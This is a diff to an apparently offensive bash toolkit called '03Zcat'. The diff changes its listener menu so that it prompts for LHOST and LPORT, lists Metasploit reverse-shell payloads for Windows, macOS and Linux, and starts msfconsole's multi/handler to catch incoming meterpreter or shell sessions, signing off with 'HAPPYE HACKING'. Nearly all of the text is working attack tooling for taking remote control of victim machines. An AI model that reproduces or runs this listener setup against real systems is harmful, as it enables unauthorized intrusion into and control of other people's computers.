@@ -996,11 +996,26 @@ sleep 0.3
 echo -e "\033[1;36m ____  ____  ____  ____  ____  ____ "
 echo -e "\033[1;36m||l ||||i ||||s ||||t ||||e ||||n ||"
 echo -e "\033[1;36m||__||||__||||__||||__||||__||||__||"
-sleep 0.3
 echo -e "${Green}[☣️03Zcat] OPENING MSFCONSOLE${Green}... "
 echo -ne "\n${Blue}[☣️03Zcat] LHOST>> ${White}"; read ip
 echo -ne "${Blue}[☣️03Zcat] LPORT>> ${White}"; read port
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit -j "
+sleep 0.3
+echo -e "\n"
+echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
+echo -e "+\t${Green}        ☣️☣️  List payload meterpreter/shell ☣️☣️              +"
+echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
+sleep 0.3
+echo -ne "${Blue}☣ "
+echo -e "${White}${Purple}windows/meterpreter/reverse_tcp         ${Blue}        "
+echo -e "☣ ${White}${Purple}windows/meterpreter/reverse_http       ${Blue}        "
+echo -e "☣ ${White}${Purple}windows/shell/reverse_tcp       ${Blue}         "
+echo -e "☣ ${White}${Purple}osx/x86/meterpreter_reverse_tcp   ${Blue}         "
+echo -e "☣ ${White}${Purple}osx/x86/meterpreter_reverse_http   ${Blue}         "
+echo -e "☣ ${White}${Purple}linux/x86/meterpreter_reverse_tcp    ${Blue}         "
+echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
+sleep 0.3
+echo -ne "${Blue}[☣️03Zcat] PAYLOADs>> ${White}"; read payload
+msfconsole -q -x "use exploit/multi/handler; set payload $payload; set LHOST $ip ; set LPORT $port ; exploit -j "
 echo -e "${Cyan}[☣️03Zcat]           ☠☠ HAPPYE HACKING ☠☠
     
     
